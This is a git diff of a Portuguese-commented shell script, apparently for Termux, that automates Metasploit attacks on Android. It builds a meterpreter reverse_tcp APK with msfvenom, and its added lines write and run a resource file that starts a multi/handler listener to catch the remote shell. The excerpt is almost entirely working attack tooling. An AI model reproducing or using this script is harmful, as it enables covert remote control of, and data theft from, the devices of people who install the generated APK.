@@ -53,7 +53,17 @@ cd /data/data/com.termux/files/home/metasploit-framework
 #
 #Criando payload
 ./msfvenom -p $dispo/meterpreter/reverse_tcp LHOST=$host LPORT=$porta R > /sdcard/$nome.apk
-./msfconsole
+
+     echo "use exploit/multi/handler" >> .metaconftmp.rc
+     echo "set payload $dispo/meterpreter/reverse_tcp" >> .metaconftmp.rc
+     echo "set lhost $host" >> .metaconftmp.rc
+     echo "set lport $porta" >> .metaconftmp.rc
+     echo "exploit" >> .metaconftmp.rc
+     echo
+     ./msfconsole -r .metaconftmp.rc
+     sleep 1
+     rm -rf .metaconftmp.rc
+     exit
 fi
 if [ "$opcao" = "2" ];then
 echo
